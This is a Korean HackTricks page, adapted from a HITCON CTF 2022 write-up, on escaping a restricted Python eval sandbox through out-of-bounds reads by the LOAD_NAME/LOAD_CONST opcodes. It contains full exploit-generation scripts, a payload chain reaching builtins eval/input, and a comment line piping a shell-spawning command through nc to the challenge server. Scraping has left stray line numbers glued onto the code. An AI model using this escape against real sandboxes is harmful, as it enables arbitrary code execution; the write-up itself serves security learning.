# LOAD_NAME / LOAD_CONST opcode OOB Read

{% hint style="success" %}
AWS 해킹을 배우고 실습하세요:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹을 배우고 실습하세요: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 레포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}

**이 정보는** [**이 글에서 가져왔습니다**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD_NAME / LOAD_CONST 옵코드의 OOB read 기능을 사용하여 메모리에서 일부 심볼을 얻을 수 있습니다. 이는 원하는 심볼(예: 함수 이름)을 얻기 위해 `(a, b, c, ... 수백 개의 심볼 ..., __getattribute__) if [] else [].__getattribute__(...)`와 같은 트릭을 사용하는 것을 의미합니다.

그런 다음 exploit을 작성하세요.

### 개요 <a href="#overview-1" id="overview-1"></a>

소스 코드는 매우 짧으며, 단 4줄만 포함되어 있습니다!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

세그멘테이션 오류가 발생하는 방법은 무엇인가요?

간단한 예제로 시작해보겠습니다. `[a, b, c]`는 다음과 같은 바이트 코드로 컴파일될 수 있습니다.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
하지만 `co_names`이 빈 튜플이 되면 어떻게 될까요? `LOAD_NAME 2` 옵코드는 여전히 실행되고, 원래 있어야 했던 메모리 주소에서 값을 읽으려고 시도합니다. 네, 이것은 경계를 벗어난 읽기 "기능"입니다.

해결책의 핵심 개념은 간단합니다. CPython의 일부 옵코드인 `LOAD_NAME` 및 `LOAD_CONST`는 OOB(Out-Of-Bound) 읽기에 취약할 수 있습니다.

이들은 `co_consts` 및 `co_names`로 내부적으로 명명된 `consts` 또는 `names` 튜플에서 인덱스 `oparg`에서 객체를 검색합니다. CPython이 `LOAD_CONST` 옵코드를 처리할 때 무엇을 하는지 알아보기 위해 `LOAD_CONST`에 대한 다음 짧은 코드 조각을 참조할 수 있습니다.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
### Exploit 생성 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

이렇게 하면 OOB 기능을 사용하여 임의의 메모리 오프셋에서 "name"을 가져올 수 있습니다. 어떤 이름을 가지고 있는지와 오프셋이 무엇인지 확인하려면 `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... 계속 시도하면 됩니다. 그리고 약 oparg > 700에서 무언가를 찾을 수 있습니다. 물론 gdb를 사용하여 메모리 레이아웃을 살펴볼 수도 있지만, 더 쉬울 것 같지는 않습니다.

### Exploit 생성 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

유용한 오프셋들을 이름/상수로 검색한 후, 해당 오프셋에서 이름/상수를 가져와 사용하는 방법은 무엇일까요? 여기에 한 가지 요령이 있습니다:\
예를 들어 `co_names=()`로 `LOAD_NAME 5`에서 오프셋 5에서 `__getattribute__` 이름을 가져올 수 있다고 가정해봅시다. 그럼 다음과 같은 작업을 수행하면 됩니다:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> `__getattribute__`로 이름을 지을 필요는 없습니다. 더 짧거나 더 이상한 이름으로 지을 수도 있습니다.

바이트코드를 보기만 해도 그 이유를 이해할 수 있습니다:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`도 `co_names`에서 이름을 검색합니다. Python은 이름이 동일한 경우 동일한 오프셋에서 이름을 로드하므로 두 번째 `__getattribute__`는 여전히 오프셋=5에서 로드됩니다. 이 기능을 사용하면 이름이 메모리 근처에 있으면 임의의 이름을 사용할 수 있습니다.

숫자를 생성하는 것은 간단해야 합니다:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### 악용 스크립트 <a href="#exploit-script-1" id="exploit-script-1"></a>

길이 제한 때문에 상수를 사용하지 않았습니다.

먼저 여기에는 이름의 오프셋을 찾기 위한 스크립트가 있습니다.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
그리고 다음은 실제 Python exploit을 생성하는 데 사용됩니다.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
그것은 기본적으로 다음 작업을 수행합니다. 우리가 `__dir__` 메소드에서 얻는 문자열에 대해:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 팁을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
{% endhint %}
